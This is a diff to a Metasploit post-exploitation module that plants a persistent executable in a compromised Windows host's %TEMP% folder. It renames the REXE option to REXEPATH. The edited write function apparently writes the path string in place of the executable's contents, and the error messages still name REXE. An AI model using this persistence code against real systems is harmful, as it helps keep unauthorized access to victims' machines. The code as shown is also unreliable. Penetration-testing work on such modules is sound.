@@ -39,7 +39,7 @@ class MetasploitModule < Msf::Post
     register_options(
         [
             OptEnum.new('STARTUP', [true, 'Startup type for the persistent payload.', 'USER', ['USER','SYSTEM','SERVICE']]),
-            OptString.new('REXE',[true, 'The remote executable to use.','my/default/path']),
+            OptString.new('REXEPATH',[true, 'The remote executable to use.','my/default/path']),
             OptString.new('REXENAME',[true, 'The name to call exe on remote system','default.exe'])
         ], self.class)
 
@@ -52,18 +52,18 @@ class MetasploitModule < Msf::Post
         print_status("Running module against #{sysinfo['Computer']}")
 
         # Set vars
-        rexe = datastore['REXE']
+        rexe = datastore['REXEPATH']
         rexename = datastore['REXENAME']
         host,port = session.tunnel_peer.split(':')
         @clean_up_rc = ""
 
 
-        if datastore['REXE'] == nil
+        if datastore['REXEPATH'] == nil
             print_error ("REXE is null...please define")
             return
         end
 
-        if not ::File.exist?(datastore['REXE'])
+        if not ::File.exist?(datastore['REXEPATH'])
             print_error ("REXE file does not exist!")
             return
         end
@@ -179,16 +179,16 @@ end
 
         # Function for writing executable to target host
         #-------------------------------------------------------------------------------
-        def write_exe_to_target(vbs,rexename)
+        def write_exe_to_target(rexe ,rexename)
 
             tempdir = session.fs.file.expand_path("%TEMP%")
-            tempvbs = tempdir + "\\" + rexename
-            fd = session.fs.file.new(tempvbs, "wb")
-            fd.write(vbs)
+            temprexe = tempdir + "\\" + rexename
+            fd = session.fs.file.new(temprexe, "wb")
+            fd.write(rexe)
             fd.close
-            print_good("Persistent Script written to #{tempvbs}")
-            @clean_up_rc << "rm #{tempvbs}\n"
-            return tempvbs
+            print_good("Persistent Script written to #{temprexe}")
+            @clean_up_rc << "rm #{temprexe}\n"
+            return temprexe
 
         end
 
